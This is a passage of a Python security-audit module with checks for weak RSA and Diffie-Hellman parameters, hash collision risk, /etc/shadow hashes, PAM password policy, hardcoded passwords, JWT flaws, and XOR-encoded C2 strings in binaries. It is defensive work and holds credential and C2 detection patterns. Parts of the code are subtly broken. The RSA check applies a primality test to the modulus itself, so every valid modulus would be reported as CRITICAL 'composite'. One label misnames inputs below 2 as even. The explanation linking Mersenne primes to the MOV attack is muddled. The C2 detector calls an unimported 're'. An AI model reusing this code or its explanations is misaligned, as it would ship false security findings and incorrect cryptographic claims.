# for Cryptography (Miller-Rabin, Fermat factoring, birthday paradox, DH safety)


def miller_rabin_primality(n: int, rounds: int = 5) -> bool:
    """
    Miller-Rabin probabilistic primality test — pure Python, no third-party deps.

    Decomposes n-1 = 2^r * d (d odd). For each witness a: computes x = a^d mod n;
    if x != 1 and x != n-1, squares up to r-1 times looking for n-1. If never
    found, n is composite.

    Deterministic witness sets (proven sufficient for bounded n):
      n < 3,215,031,751        → {2, 3, 5, 7}
      n < 3.3e24               → {2, 3, 5, 7, 11, 13, 17, 19, 23}
    Above that: fixed set plus random witnesses up to `rounds` total.

    Returns True if probable prime, False if definitely composite.
    Edge cases: n < 2 → False; n in {2, 3} → True; n even → False.
    """
    import random as _random

    if n < 2:
        return False
    if n in (2, 3):
        return True
    if n % 2 == 0:
        return False
    if n < 9:
        return True  # 5, 7 are prime

    # Decompose n-1 = 2^r * d (d odd)
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d >>= 1

    # Deterministic witness sets
    if n < 3_215_031_751:
        witnesses = [2, 3, 5, 7]
    elif n < 3_317_044_064_679_887_385_961_981:
        witnesses = [2, 3, 5, 7, 11, 13, 17, 19, 23]
    else:
        witnesses = [2, 3, 5, 7, 11]
        used = set(witnesses)
        while len(witnesses) < rounds:
            w = _random.randrange(2, n - 2)
            if w not in used:
                witnesses.append(w)
                used.add(w)

    for a in witnesses:
        if a >= n - 1:
            continue
        x = pow(a, d, n)          # stdlib fast modular exponentiation
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False           # composite witness found

    return True                    # probable prime


def check_weak_prime(n: int) -> dict | None:
    """
    Detect cryptographically weak primes in an RSA modulus or candidate prime n.

    Checks (first match returned):
      1. n even                          → CRITICAL  EVEN_RSA_MODULUS
      2. Small factor (trial div ≤65537) → CRITICAL  SMALL_FACTOR_IN_RSA_MODULUS
      3. Perfect square (p == q)         → HIGH      PERFECT_SQUARE_MODULUS
      4. Fermat factoring feasible       → CRITICAL  FERMAT_FACTORING_VULNERABLE
      5. Miller-Rabin: composite         → CRITICAL  RSA_MODULUS_COMPOSITE
      6. Probable prime but < 1024 bits  → HIGH      RSA_PRIME_TOO_SHORT

    Returns a single finding dict or None if no weakness detected.
    """
    import math as _math

    if n < 2:
        return {
            "severity": "CRITICAL",
            "title": "EVEN_RSA_MODULUS",
            "detail": f"n={n} is less than 2 — invalid RSA modulus.",
            "host": "localhost",
            "port": 0,
        }

    # 1. Even check
    if n % 2 == 0:
        return {
            "severity": "CRITICAL",
            "title": "EVEN_RSA_MODULUS",
            "detail": (
                f"RSA modulus n is even (bits={n.bit_length()}). "
                "A valid RSA modulus is the product of two distinct odd primes — "
                "an even modulus is trivially factorable (p=2 divides n directly)."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 2. Small prime factor trial division up to 65537 (odd candidates only)
    f = 3
    while f <= 65537 and f * f <= n:
        if n % f == 0:
            return {
                "severity": "CRITICAL",
                "title": "SMALL_FACTOR_IN_RSA_MODULUS",
                "detail": (
                    f"RSA modulus n (bits={n.bit_length()}) is divisible by small prime {f} — "
                    "trivially factorable. "
                    f"Extracted factor: {f} | Cofactor: {n // f}. "
                    "Correct RSA key generation requires cryptographically random large primes; "
                    "a small factor indicates broken or backdoored prime generation."
                ),
                "host": "localhost",
                "port": 0,
            }
        f += 2

    # 3. Perfect square check (implies p == q, i.e., Fermat distance = 0)
    s = _math.isqrt(n)
    if s * s == n:
        return {
            "severity": "HIGH",
            "title": "PERFECT_SQUARE_MODULUS",
            "detail": (
                f"RSA modulus n is a perfect square: n = {s}^2 (bits={n.bit_length()}). "
                "This implies p == q — a degenerate and completely insecure RSA construction. "
                "Recovery: p = q = isqrt(n) in O(1) operations with no factoring required."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 4. Fermat factoring feasibility:
    #    if (isqrt(n)+1)^2 - n is within 0.001% of n, p and q are too close.
    #    Fermat's method: a = ceil(sqrt(n)), iterate until a^2 - n is a perfect square.
    #    Converges in O(1) steps when |p - q| << sqrt(n).
    fermat_gap = (s + 1) * (s + 1) - n
    threshold = n // 100_000      # 0.001% of n
    if fermat_gap > 0 and fermat_gap < threshold:
        return {
            "severity": "CRITICAL",
            "title": "FERMAT_FACTORING_VULNERABLE",
            "detail": (
                f"RSA modulus n (bits={n.bit_length()}) is vulnerable to Fermat's factoring attack. "
                f"(isqrt(n)+1)^2 - n = {fermat_gap} < threshold {threshold} (0.001% of n). "
                "Primes p and q are nearly equal — Fermat's method (a^2 - n = b^2 → "
                "n = (a-b)(a+b)) converges in O(1) iterations when |p - q| is small. "
                "Key generation must enforce |p - q| > 2^(key_bits/2 - 100)."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 5. Miller-Rabin primality: a valid RSA prime must pass; composite = broken generation
    if not miller_rabin_primality(n):
        return {
            "severity": "CRITICAL",
            "title": "RSA_MODULUS_COMPOSITE",
            "detail": (
                f"n (bits={n.bit_length()}) failed Miller-Rabin primality — it is composite. "
                "RSA prime candidates must pass a strong primality test before use. "
                "A composite value used as a prime exposes the key to Pohlig-Hellman "
                "decomposition and allows trivial factorization via Euler's theorem."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 6. Probable prime but bit length below minimum
    bit_len = n.bit_length()
    if bit_len < 1024:
        return {
            "severity": "HIGH",
            "title": "RSA_PRIME_TOO_SHORT",
            "detail": (
                f"RSA prime candidate n is {bit_len} bits — below the 1024-bit minimum. "
                "NIST SP 800-57 requires RSA-2048 (two 1024-bit primes). "
                "Short primes are within reach of the elliptic curve method (ECM) or GNFS. "
                "RSA-512 was factored in 1999; RSA-768 in 2009."
            ),
            "host": "localhost",
            "port": 0,
        }

    return None


def check_discrete_log_weakness(p: int, g: int) -> dict | None:
    """
    Detect weaknesses in Diffie-Hellman parameters (prime modulus p, generator g).

    Checks (first match returned):
      1. p not prime (Miller-Rabin)       → CRITICAL  DH_PRIME_NOT_PRIME
      2. p < 1024 bits                    → CRITICAL  DH_PRIME_TOO_SHORT
      3. g == 1                           → CRITICAL  DH_GENERATOR_IS_ONE
      4. p is a Mersenne number (2^k - 1) → LOW       DH_MERSENNE_PRIME
      5. p % 4 != 3                       → MEDIUM    DH_PRIME_NOT_SAFE

    Returns a single finding dict or None if no weakness detected.
    """
    # 1. p must be prime — a composite modulus collapses DH via Pohlig-Hellman + CRT
    if not miller_rabin_primality(p):
        return {
            "severity": "CRITICAL",
            "title": "DH_PRIME_NOT_PRIME",
            "detail": (
                f"DH prime p (bits={p.bit_length()}) failed Miller-Rabin primality — "
                "p is composite. With a composite modulus the discrete logarithm decomposes "
                "independently in each prime-order subgroup (Pohlig-Hellman) and is combined "
                "via CRT. All DH security collapses immediately."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 2. p bit length
    bit_len = p.bit_length()
    if bit_len < 1024:
        return {
            "severity": "CRITICAL",
            "title": "DH_PRIME_TOO_SHORT",
            "detail": (
                f"DH prime p is {bit_len} bits — below the 1024-bit absolute minimum "
                "(NIST SP 800-57 recommends >= 2048 bits for DH). "
                "LOGJAM (2015) exploited 512- and 768-bit DH in TLS at scale. "
                "Sub-1024-bit DH is precomputable with nation-state resources via NFS."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 3. Generator g == 1 — all shared secrets are 1 regardless of private key
    if g == 1:
        return {
            "severity": "CRITICAL",
            "title": "DH_GENERATOR_IS_ONE",
            "detail": (
                "DH generator g == 1. Any power of 1 is 1: g^x mod p == 1 for all x. "
                "The shared secret g^(ab) mod p is always 1 regardless of private keys a and b. "
                "DH key exchange provides zero security with g=1."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 4. Mersenne number check: p == 2^k - 1 (all bits set in k-bit representation)
    k = p.bit_length()
    if p == (1 << k) - 1:
        return {
            "severity": "LOW",
            "title": "DH_MERSENNE_PRIME",
            "detail": (
                f"DH prime p = 2^{k} - 1 is a Mersenne prime. "
                "Mersenne primes carry special multiplicative structure that may be exploitable "
                "by the MOV attack (Menezes-Okamoto-Vanstone) if the associated elliptic "
                "curve has small embedding degree, reducing the DLP to a finite-field problem. "
                "Prefer NIST-standardized safe primes (RFC 3526, RFC 7919)."
            ),
            "host": "localhost",
            "port": 0,
        }

    # 5. Safe prime check: p ≡ 3 (mod 4) is necessary (not sufficient) for p = 2q+1
    #    Non-safe primes have subgroups of small order; Pohlig-Hellman exploits these.
    if p % 4 != 3:
        return {
            "severity": "MEDIUM",
            "title": "DH_PRIME_NOT_SAFE",
            "detail": (
                f"DH prime p ≡ {p % 4} (mod 4). Safe primes satisfy p ≡ 3 (mod 4) "
                "(i.e., p = 2q+1 where q is also prime, giving only one non-trivial subgroup). "
                "Non-safe primes allow Pohlig-Hellman to decompose the DLP across small-order "
                "subgroups of (p-1), making the discrete log tractable. "
                "Use RFC 3526 / RFC 7919 well-known groups."
            ),
            "host": "localhost",
            "port": 0,
        }

    return None


def check_birthday_collision_risk(hash_bits: int, num_samples: int) -> dict:
    """
    Compute birthday paradox collision probability for a hash function.

    P(collision) ≈ 1 - exp(-n*(n-1) / (2 * 2^bits))
                 ≈ n^2 / (2 * 2^bits)   for small P

    Fixed thresholds:
      hash_bits == 32  and num_samples > 65,536        → CRITICAL  BIRTHDAY_COLLISION_NEAR_CERTAIN_32BIT
      hash_bits == 64  and num_samples > 4,294,967,296 → HIGH      BIRTHDAY_COLLISION_RISK_64BIT
      hash_bits == 128 and num_samples > 2^64           → LOW       BIRTHDAY_COLLISION_RISK_128BIT
    All other cases: severity derived from computed probability (>50% HIGH, >1% MEDIUM, else INFO).

    Always returns a finding dict with computed approximate probability.
    """
    import math as _math

    two_to_bits = 1 << hash_bits
    # P(collision) = 1 - e^(-n*(n-1)/(2*2^bits)); clamp exponent to avoid underflow
    exponent = -(num_samples * (num_samples - 1)) / (2.0 * two_to_bits)
    if exponent < -700:
        prob = 1.0
    else:
        prob = 1.0 - _math.exp(exponent)
    prob_pct = prob * 100.0

    if hash_bits == 32 and num_samples > 65_536:
        severity = "CRITICAL"
        title = "BIRTHDAY_COLLISION_NEAR_CERTAIN_32BIT"
        detail = (
            f"32-bit hash ({hash_bits} bits) with {num_samples:,} samples: "
            f"collision probability ≈ {prob_pct:.2f}%. "
            "Birthday bound for 2^32 output space is ~2^16 = 65,536 samples (sqrt(2^32)). "
            "32-bit hashes must not be used for any integrity or identity purpose at scale. "
            "Replace with SHA-256 or stronger."
        )
    elif hash_bits == 64 and num_samples > 4_294_967_296:
        severity = "HIGH"
        title = "BIRTHDAY_COLLISION_RISK_64BIT"
        detail = (
            f"64-bit hash with {num_samples:,} samples: "
            f"collision probability ≈ {prob_pct:.4f}%. "
            "Birthday bound for 64-bit hashes is ~2^32 ≈ 4.3B samples. "
            "64-bit truncated hashes (e.g., SipHash-64, truncated SHA-1) are insufficient "
            "for high-volume or long-lived applications."
        )
    elif hash_bits == 128 and num_samples > (1 << 64):
        severity = "LOW"
        title = "BIRTHDAY_COLLISION_RISK_128BIT"
        detail = (
            f"128-bit hash with {num_samples:,} samples: "
            f"collision probability ≈ {prob_pct:.6f}%. "
            "128-bit output (e.g., MD5) has birthday bound ~2^64 ≈ 1.8e19 samples. "
            "Note: MD5 is cryptographically broken independent of bit width — "
            "collisions are constructible in under 1 second; MD5 must not be used for security."
        )
    else:
        if prob > 0.5:
            severity = "HIGH"
            title = "BIRTHDAY_COLLISION_PROBABLE"
        elif prob > 0.01:
            severity = "MEDIUM"
            title = "BIRTHDAY_COLLISION_RISK"
        else:
            severity = "INFO"
            title = "BIRTHDAY_COLLISION_LOW_RISK"
        detail = (
            f"{hash_bits}-bit hash with {num_samples:,} samples: "
            f"collision probability ≈ {prob_pct:.4f}%. "
            f"Birthday bound (50% collision threshold): ~{1 << (hash_bits // 2):,} samples "
            f"(2^{hash_bits // 2})."
        )

    return {
        "severity": severity,
        "title": title,
        "detail": detail,
        "host": "localhost",
        "port": 0,
        "collision_probability": round(prob, 8),
        "hash_bits": hash_bits,
        "num_samples": num_samples,
    }


def extract_rsa_modulus_from_cert_der(der_bytes: bytes) -> int:
    """
    Parse RSA modulus from a DER-encoded X.509 certificate.

    ASN.1 walk path:
      Certificate SEQUENCE
        TBSCertificate SEQUENCE
          [0] version (optional)
          serialNumber INTEGER
          signature AlgorithmIdentifier SEQUENCE
          issuer Name SEQUENCE
          validity SEQUENCE
          subject Name SEQUENCE
          SubjectPublicKeyInfo SEQUENCE
            AlgorithmIdentifier SEQUENCE
            BIT STRING  ← 0x00 unused-bits byte || RSAPublicKey DER
              RSAPublicKey SEQUENCE
                modulus INTEGER   ← returned
                publicExponent INTEGER

    Returns modulus as Python int, or 0 on any parse failure.
    """

    def _read_length(data: bytes, idx: int):
        """Parse DER definite length at data[idx]. Return (length, next_idx)."""
        if idx >= len(data):
            raise ValueError("length read past buffer end")
        b = data[idx]
        if b & 0x80 == 0:
            return b, idx + 1
        n_len = b & 0x7f
        if n_len == 0 or idx + 1 + n_len > len(data):
            raise ValueError("indefinite or oversized length encoding")
        length = int.from_bytes(data[idx + 1: idx + 1 + n_len], "big")
        return length, idx + 1 + n_len

    def _read_tlv(data: bytes, idx: int):
        """Read one TLV at data[idx]. Return (tag, value_bytes, next_idx)."""
        if idx >= len(data):
            raise ValueError("TLV read past buffer end")
        tag = data[idx]
        length, idx2 = _read_length(data, idx + 1)
        end = idx2 + length
        if end > len(data):
            raise ValueError(f"TLV end {end} exceeds buffer length {len(data)}")
        return tag, data[idx2:end], end

    def _unwrap_seq(data: bytes, idx: int = 0):
        """Assert SEQUENCE (0x30) at data[idx], return (content_bytes, next_idx)."""
        tag, content, next_idx = _read_tlv(data, idx)
        if tag != 0x30:
            raise ValueError(f"Expected SEQUENCE 0x30, got 0x{tag:02x} at offset {idx}")
        return content, next_idx

    try:
        # Outer Certificate SEQUENCE
        cert_content, _ = _unwrap_seq(der_bytes, 0)

        # TBSCertificate SEQUENCE (first child of Certificate)
        tbs_content, _ = _unwrap_seq(cert_content, 0)

        # Walk TBSCertificate to reach SubjectPublicKeyInfo
        idx = 0

        # [0] EXPLICIT version (tag 0xa0, optional in X.509v1)
        if idx < len(tbs_content) and tbs_content[idx] == 0xa0:
            _, _, idx = _read_tlv(tbs_content, idx)

        # serialNumber INTEGER (0x02)
        if idx < len(tbs_content) and tbs_content[idx] == 0x02:
            _, _, idx = _read_tlv(tbs_content, idx)

        # signature AlgorithmIdentifier SEQUENCE (0x30)
        if idx < len(tbs_content) and tbs_content[idx] == 0x30:
            _, _, idx = _read_tlv(tbs_content, idx)

        # issuer Name SEQUENCE (0x30)
        if idx < len(tbs_content) and tbs_content[idx] == 0x30:
            _, _, idx = _read_tlv(tbs_content, idx)

        # validity SEQUENCE (0x30)
        if idx < len(tbs_content) and tbs_content[idx] == 0x30:
            _, _, idx = _read_tlv(tbs_content, idx)

        # subject Name SEQUENCE (0x30)
        if idx < len(tbs_content) and tbs_content[idx] == 0x30:
            _, _, idx = _read_tlv(tbs_content, idx)

        # SubjectPublicKeyInfo SEQUENCE (0x30)
        if idx >= len(tbs_content) or tbs_content[idx] != 0x30:
            return 0
        spki_content, _ = _unwrap_seq(tbs_content, idx)

        # Inside SPKI: skip AlgorithmIdentifier SEQUENCE, then read BIT STRING
        spki_idx = 0
        if spki_idx < len(spki_content) and spki_content[spki_idx] == 0x30:
            _, _, spki_idx = _read_tlv(spki_content, spki_idx)

        # BIT STRING (tag 0x03) contains the public key
        if spki_idx >= len(spki_content) or spki_content[spki_idx] != 0x03:
            return 0
        _, bs_value, _ = _read_tlv(spki_content, spki_idx)

        # First byte of BIT STRING value = number of unused bits in final octet (0x00 for keys)
        if not bs_value or bs_value[0] != 0x00:
            return 0
        rsa_key_der = bs_value[1:]

        # RSAPublicKey SEQUENCE { modulus INTEGER, publicExponent INTEGER }
        if not rsa_key_der or rsa_key_der[0] != 0x30:
            return 0
        rsa_key_content, _ = _unwrap_seq(rsa_key_der, 0)

        # modulus INTEGER (0x02)
        if not rsa_key_content or rsa_key_content[0] != 0x02:
            return 0
        _, mod_bytes, _ = _read_tlv(rsa_key_content, 0)

        # DER integers may have a leading 0x00 sign-extension byte — strip it
        if mod_bytes and mod_bytes[0] == 0x00:
            mod_bytes = mod_bytes[1:]

        return int.from_bytes(mod_bytes, "big") if mod_bytes else 0

    except Exception:
        return 0


def check_shadow_password_weakness(shadow_content: str) -> list:
    """Parse /etc/shadow content and return password hash weakness findings."""
    import re as _re

    findings = []
    for line in shadow_content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) < 2:
            continue
        username = parts[0]
        hash_field = parts[1]
        last_change = parts[2] if len(parts) > 2 else ""
        min_age = parts[3] if len(parts) > 3 else ""
        max_age = parts[4] if len(parts) > 4 else ""

        detail_prefix = f"User: {username}"

        if hash_field in ("!", "*", "!!", ""):
            findings.append({
                "severity": "HIGH",
                "title": "LOCKED_OR_BLANK_PASSWORD",
                "detail": f"{detail_prefix} — locked/blank password marker in active account",
                "host": "localhost",
                "port": 0,
            })
            continue

        # DES crypt: exactly 13 chars, no $ prefix, printable [./A-Za-z0-9]
        if (
            not hash_field.startswith("$")
            and len(hash_field) == 13
            and _re.match(r'^[./A-Za-z0-9]{13}$', hash_field)
        ):
            findings.append({
                "severity": "CRITICAL",
                "title": "DES_CRYPT_HASH",
                "detail": f"{detail_prefix} — DES crypt hash broken in seconds with modern hardware",
                "host": "localhost",
                "port": 0,
            })
            continue

        if hash_field.startswith("$1$"):
            findings.append({
                "severity": "CRITICAL",
                "title": "MD5_CRYPT_HASH",
                "detail": f"{detail_prefix} — MD5-crypt ($1$) is crackable with modern hardware",
                "host": "localhost",
                "port": 0,
            })

        elif hash_field.startswith(("$2a$", "$2b$", "$2y$")):
            # $2a$10$... — extract cost factor
            m = _re.match(r'^\$2[aby]\$(\d+)\$', hash_field)
            if m:
                rounds = int(m.group(1))
                if rounds < 10:
                    findings.append({
                        "severity": "HIGH",
                        "title": "BCRYPT_LOW_ROUNDS",
                        "detail": f"{detail_prefix} — bcrypt cost {rounds} < 10 (minimum recommended)",
                        "host": "localhost",
                        "port": 0,
                    })

        elif hash_field.startswith("$5$"):
            # SHA-256-crypt: optional rounds=N$ prefix
            m = _re.match(r'^\$5\$rounds=(\d+)\$', hash_field)
            rounds = int(m.group(1)) if m else 5000  # default when omitted
            if rounds < 10000:
                findings.append({
                    "severity": "HIGH",
                    "title": "SHA256_CRYPT_LOW_ROUNDS",
                    "detail": f"{detail_prefix} — SHA-256-crypt rounds {rounds} < 10000",
                    "host": "localhost",
                    "port": 0,
                })

        elif hash_field.startswith("$6$"):
            # SHA-512-crypt
            m = _re.match(r'^\$6\$rounds=(\d+)\$', hash_field)
            rounds = int(m.group(1)) if m else 5000
            if rounds < 65536:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "SHA512_CRYPT_LOW_ROUNDS",
                    "detail": f"{detail_prefix} — SHA-512-crypt rounds {rounds} < 65536",
                    "host": "localhost",
                    "port": 0,
                })

        # last_change=0 means forced reset; no max_age means no expiry enforced
        if last_change == "0" and (not max_age or max_age in ("", "99999")):
            findings.append({
                "severity": "MEDIUM",
                "title": "PASSWORD_NEVER_EXPIRES",
                "detail": f"{detail_prefix} — last_change=0 (must change) but no maximum age set",
                "host": "localhost",
                "port": 0,
            })

    return findings


def check_password_policy_weakness(pam_config_text: str) -> list:
    """Analyse PAM configuration text and return password policy weakness findings."""
    import re as _re

    findings = []

    # Complexity enforcement
    has_complexity = bool(
        _re.search(r'\bpam_pwquality\b', pam_config_text)
        or _re.search(r'\bpam_cracklib\b', pam_config_text)
    )
    if not has_complexity:
        findings.append({
            "severity": "HIGH",
            "title": "NO_PASSWORD_COMPLEXITY_ENFORCEMENT",
            "detail": "No pam_pwquality or pam_cracklib module found — complexity not enforced",
            "host": "localhost",
            "port": 0,
        })

    # Minimum length
    m = _re.search(r'\bminlen\s*=\s*(\d+)', pam_config_text)
    if m:
        minlen = int(m.group(1))
        if minlen < 12:
            findings.append({
                "severity": "HIGH",
                "title": "MIN_PASSWORD_LENGTH_TOO_SHORT",
                "detail": f"minlen={minlen} — minimum password length below 12 characters",
                "host": "localhost",
                "port": 0,
            })

    # Account lockout
    has_lockout = bool(
        _re.search(r'\bpam_faillock\b', pam_config_text)
        or _re.search(r'\bpam_tally2\b', pam_config_text)
    )
    if not has_lockout:
        findings.append({
            "severity": "HIGH",
            "title": "NO_LOCKOUT_POLICY",
            "detail": "No pam_faillock or pam_tally2 module — brute-force attacks not rate-limited",
            "host": "localhost",
            "port": 0,
        })

    # Retry limit
    m_retry = _re.search(r'\bretry\s*=\s*(\d+)', pam_config_text)
    if not m_retry or int(m_retry.group(1)) > 3:
        retry_val = m_retry.group(1) if m_retry else "not set"
        findings.append({
            "severity": "MEDIUM",
            "title": "HIGH_RETRY_LIMIT",
            "detail": f"retry={retry_val} — password retry limit not set or exceeds 3",
            "host": "localhost",
            "port": 0,
        })

    # Null passwords
    if _re.search(r'\bnullok\b', pam_config_text):
        findings.append({
            "severity": "CRITICAL",
            "title": "NULL_PASSWORDS_ALLOWED",
            "detail": "nullok option present — empty passwords permitted for PAM authentication",
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_password_in_binary(binary_data: bytes) -> list:
    """Scan binary data for hardcoded default passwords and credential strings."""
    import re as _re

    findings = []

    default_passwords = [
        b"admin\x00",
        b"password\x00",
        b"cisco\x00",
        b"root\x00",
        b"1234\x00",
        b"12345678\x00",
        b"letmein\x00",
        b"welcome\x00",
        b"changeme\x00",
    ]
    seen_defaults = set()
    for pwd in default_passwords:
        if pwd in binary_data and pwd not in seen_defaults:
            seen_defaults.add(pwd)
            findings.append({
                "severity": "HIGH",
                "title": "HARDCODED_DEFAULT_PASSWORD",
                "detail": f"Default credential string found: {pwd[:-1].decode('ascii', errors='replace')}",
                "host": "localhost",
                "port": 0,
            })

    # password= / passwd= / secret= patterns followed by a value
    patterns = [
        (rb'password[= :]+([^\x00]{4,32})\x00', "HARDCODED_PASSWORD_STRING"),
        (rb'passwd[= :]+([^\x00]{4,32})\x00', "HARDCODED_SECRET_STRING"),
        (rb'secret[= :]+([^\x00]{4,32})\x00', "HARDCODED_SECRET_STRING"),
    ]
    for pattern, title in patterns:
        for m in _re.finditer(pattern, binary_data, _re.IGNORECASE):
            value = m.group(1).decode("latin-1", errors="replace")
            findings.append({
                "severity": "CRITICAL",
                "title": title,
                "detail": f"Hardcoded credential pattern detected: value={value!r}",
                "host": "localhost",
                "port": 0,
            })

    return findings


def check_jwt_weakness(token: str) -> dict:
    """Analyse a JWT token string and return the most severe weakness found."""
    import base64 as _base64
    import json as _json
    import re as _re

    def _b64_decode(s: str) -> bytes:
        # Add padding and decode URL-safe base64
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * (-len(s) % 4)
        return _base64.b64decode(s)

    parts = token.strip().split(".")
    if len(parts) != 3:
        return {
            "severity": "MEDIUM",
            "title": "JWT_MALFORMED",
            "detail": "Token does not have three dot-separated components",
        }

    header_b64, payload_b64, sig_b64 = parts

    try:
        header = _json.loads(_b64_decode(header_b64))
    except Exception:
        return {
            "severity": "MEDIUM",
            "title": "JWT_MALFORMED",
            "detail": "Header could not be base64-decoded or JSON-parsed",
        }

    try:
        payload = _json.loads(_b64_decode(payload_b64))
    except Exception:
        payload = {}

    alg = header.get("alg", "")

    # alg=none — no signature verification
    if alg.lower() == "none":
        return {
            "severity": "CRITICAL",
            "title": "JWT_ALG_NONE",
            "detail": "alg=none — server may accept unsigned tokens with no signature verification",
        }

    # kid path traversal
    kid = header.get("kid", "")
    if kid and _re.search(r'\.\./', kid):
        return {
            "severity": "CRITICAL",
            "title": "JWT_KID_PATH_TRAVERSAL",
            "detail": f"kid claim contains path traversal sequence: {kid!r}",
        }

    # HS256 with RS256-style payload (alg confusion)
    if alg == "HS256":
        # RS256-style payloads often contain iss/aud/sub and an nbf, typical of OAuth
        rsa_indicators = sum([
            "iss" in payload,
            "aud" in payload,
            "sub" in payload,
            "nbf" in payload,
        ])
        if rsa_indicators >= 3:
            return {
                "severity": "HIGH",
                "title": "JWT_ALG_CONFUSION",
                "detail": "HS256 algorithm with RS256-style payload claims — potential RS256→HS256 confusion attack",
            }

    # Short signature
    try:
        sig_bytes = _b64_decode(sig_b64)
        if len(sig_bytes) < 32:
            return {
                "severity": "HIGH",
                "title": "JWT_SHORT_SIGNATURE",
                "detail": f"Signature is only {len(sig_bytes)} bytes — below 32-byte minimum",
            }
    except Exception:
        pass

    # No expiry claim
    if "exp" not in payload:
        return {
            "severity": "MEDIUM",
            "title": "JWT_NO_EXPIRY",
            "detail": "exp claim absent — token never expires",
        }

    return {
        "severity": "INFO",
        "title": "JWT_NO_WEAKNESS_DETECTED",
        "detail": f"alg={alg}; exp present; kid clean; signature length adequate",
    }


def detect_xor_based_c2_encoding(binary_data: bytes) -> list:
    """
    Detect XOR-based C2 encoding patterns in binary data.

    Techniques from PMA ch.13 (custom encoding) and ch.14 (combining
    dynamic+static analysis — covert channel abuse, repeating-key obfuscation,
    custom Base64 alphabet for steganographic command delivery):

      - x86 XOR AL, imm8 repeated 3+ times: compiler-unrolled or hand-coded
        single-byte-key XOR loop, the classic malware obfuscation primitive.
      - Single-byte key sweep with printable-ASCII scoring: if any key
        in 0x01–0xFF decodes >=80% of the sample to printable ASCII and
        the result contains a URL or domain, the C2 endpoint is recoverable.
      - Repeating-key period via Friedman index-of-coincidence: for a
        Vigenere/XOR cipher with period k, every k-th-byte slice retains
        the plaintext IC (>= 0.065 for ASCII text) rather than the uniform
        IC (~0.004). Lowest matching period is reported.
      - Custom Base64 alphabet: a 64-byte run of unique printable ASCII chars
        that differs from the standard A-Z a-z 0-9 +/ alphabet — used to
        evade Base64 signature detection on C2 command channels.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    if not binary_data:
        return findings

    # ── 1. x86 XOR AL, imm8 repeated 3+ times ───────────────────────────────
    # Opcode 0x34 imm8 = XOR AL, imm8. Three or more consecutive occurrences
    # with the same immediate byte indicate a manual or unrolled XOR loop.
    xor_al_re = re.compile(rb'\x34([\x01-\xFF])(?:\x34\1){2,}')
    xal_m = xor_al_re.search(binary_data)
    if xal_m:
        xor_key = xal_m.group(1)[0]
        repeat_count = len(xal_m.group(0)) // 2
        findings.append({
            "severity": "HIGH",
            "title": "XOR_C2_ENCODING",
            "detail": (
                f"x86 'XOR AL, 0x{xor_key:02X}' repeated {repeat_count}x "
                f"at offset {xal_m.start():#010x} — single-byte XOR loop; "
                "custom obfuscation detected"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. Single-byte XOR key frequency analysis → URL/domain extraction ───
    # Sweep keys 0x01–0xFF over the first 8 KB; score by printable-ASCII ratio.
    # High ratio (>=80%) + embedded URL or domain pattern in decoded output
    # means the C2 address is recoverable with a one-byte key.
    url_re = re.compile(
        rb'(?:https?://|ftp://)[A-Za-z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+'
    )
    domain_re = re.compile(
        rb'(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.){2,}'
        rb'(?:com|net|org|info|biz|ru|cn|io|onion)\b'
    )

    sample = binary_data[:8192]
    # Collect all keys with printable ratio >= 0.80; ties are common when
    # plaintext is ASCII so every candidate must be checked for URL content.
    url_found = False
    best_ratio = 0.0
    for key in range(1, 256):
        decoded = bytes(b ^ key for b in sample)
        ratio = sum(0x20 <= b < 0x7F for b in decoded) / len(decoded)
        if ratio > best_ratio:
            best_ratio = ratio
        if ratio >= 0.80 and not url_found:
            url_m = url_re.search(decoded) or domain_re.search(decoded)
            if url_m:
                snippet = url_m.group(0)[:80].decode("ascii", errors="replace")
                findings.append({
                    "severity": "CRITICAL",
                    "title": "XOR_DECODED_C2_URL",
                    "detail": (
                        f"XOR key 0x{key:02X} decodes {ratio*100:.0f}% "
                        f"of sample to printable ASCII; C2 endpoint recovered: "
                        f"{snippet!r}"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
                url_found = True

    # ── 3. Repeating-key XOR period via index of coincidence ─────────────────
    # Friedman's test: for a repeating-key XOR cipher with period k, slicing
    # every k-th byte preserves the plaintext byte distribution, so the IC
    # of each slice is close to the plaintext IC rather than the uniform IC.
    # Threshold 0.065 targets ASCII plaintext (letters + spaces dominate).
    # Reports the lowest period whose average slice IC meets the threshold.
    IC_THRESHOLD = 0.065
    work = binary_data[:16384]
    wlen = len(work)
    if wlen >= 128:
        for period in range(2, 17):
            ics = []
            for offset in range(period):
                chunk = bytes(work[offset::period])
                clen = len(chunk)
                if clen < 16:
                    continue
                freq = [0] * 256
                for b in chunk:
                    freq[b] += 1
                ic_val = sum(f * (f - 1) for f in freq) / (clen * (clen - 1))
                ics.append(ic_val)
            if ics:
                avg_ic = sum(ics) / len(ics)
                if avg_ic >= IC_THRESHOLD:
                    findings.append({
                        "severity": "HIGH",
                        "title": "ROLLING_XOR_STREAM",
                        "detail": (
                            f"IC analysis: repeating XOR key period {period} "
                            f"detected (avg slice IC {avg_ic:.4f} "
                            f">= threshold {IC_THRESHOLD}) — "
                            "cipher-like stream obfuscation"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
                    break  # lowest matching period wins

    # ── 4. Custom Base64 alphabet detection ──────────────────────────────────
    # A custom B64 table is a contiguous 64-byte run of unique printable ASCII
    # chars that does not match the standard A-Z a-z 0-9 +/ set.  Malware
    # authors substitute the alphabet to evade IDS/AV signatures tuned to the
    # standard table while preserving Base64 framing semantics.
    std_b64 = frozenset(
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    )
